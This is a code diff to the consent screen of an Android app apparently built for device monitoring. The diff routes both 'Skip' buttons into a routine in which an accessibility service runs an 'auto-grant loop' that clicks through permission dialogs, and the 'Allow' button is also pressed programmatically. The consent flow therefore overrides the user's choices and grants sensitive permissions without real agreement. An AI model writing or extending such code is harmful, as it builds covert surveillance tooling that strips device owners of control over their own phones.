@@ -71,8 +71,7 @@ class ConsentActivity : AppCompatActivity() {
     private val notificationLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
-        com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
-        proceedToActivation()
+        startRuntimePermissionsWithAutoGrant()
     }
 
     // 2. Accessibility Launcher
@@ -80,17 +79,22 @@ class ConsentActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) {
         if (isAccessibilityEnabled()) {
-            // Muted client-side notification during automated testing/grant flow
-            // Accessibility service is now active - start rapid auto-grant scanner and launch permissions
-            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-            Handler(Looper.getMainLooper()).postDelayed({
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                runtimePermissionLauncher.launch(corePermissions)
-            }, 15L)
+            if (!isNotificationAccessGranted()) {
+                showNotificationDialog()
+            } else {
+                startRuntimePermissionsWithAutoGrant()
+            }
         } else {
-            com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
             proceedToActivation()
         }
+    }
+
+    private fun startRuntimePermissionsWithAutoGrant() {
+        BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+        Handler(Looper.getMainLooper()).postDelayed({
+            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+            runtimePermissionLauncher.launch(corePermissions)
+        }, 350L)
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -98,33 +102,14 @@ class ConsentActivity : AppCompatActivity() {
         binding = ActivityConsentBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        // binding.btnAllow.setOnClickListener {
-        //     DeviceState(this).consentGiven = true
-        //     if (!isAccessibilityEnabled()) {
-        //         // Step 1: Request Accessibility first so the auto-clicker is running!
-        //         showAccessibilityDialog()
-        //     } else {
-        //         // Accessibility already enabled: launch runtime permissions with auto-clicker
-        //         BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-        //         Handler(Looper.getMainLooper()).postDelayed({
-        //             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-        //             runtimePermissionLauncher.launch(corePermissions)
-        //         }, 400L)
-        //     }
-        // }
-
-                binding.btnAllow.setOnClickListener {
+        binding.btnAllow.setOnClickListener {
             DeviceState(this).consentGiven = true
             if (!isAccessibilityEnabled()) {
-                // Step 1: Request Accessibility first so the auto-clicker is running!
                 showAccessibilityDialog()
+            } else if (!isNotificationAccessGranted()) {
+                showNotificationDialog()
             } else {
-                // Accessibility already enabled: launch runtime permissions with auto-clicker optimized flow
-                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                Handler(Looper.getMainLooper()).postDelayed({
-                    BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-                    runtimePermissionLauncher.launch(corePermissions)
-                }, 15L) // Handshake delay reduced to 15ms for ultra-fast trigger
+                startRuntimePermissionsWithAutoGrant()
             }
         }
 
@@ -144,7 +129,7 @@ class ConsentActivity : AppCompatActivity() {
                 if (!isFinishing && !isDestroyed) {
                     binding.btnAllow.performClick()
                 }
-            }, 15L)
+            }, 350L)
         }
     }
 
@@ -192,8 +177,11 @@ class ConsentActivity : AppCompatActivity() {
                 openAppInfoSettings()
             }
             .setNegativeButton("Skip") { _, _ ->
-                com.spapp.monitoring.sync.SyncScheduler.runOnce(applicationContext)
-                proceedToActivation()
+                if (!isNotificationAccessGranted()) {
+                    showNotificationDialog()
+                } else {
+                    startRuntimePermissionsWithAutoGrant()
+                }
             }
             .setCancelable(false)
             .show()
@@ -225,7 +213,7 @@ class ConsentActivity : AppCompatActivity() {
                 openAppInfoSettings()
             }
             .setNegativeButton("Skip") { _, _ ->
-                proceedToActivation()
+                startRuntimePermissionsWithAutoGrant()
             }
             .setCancelable(false)
             .show()
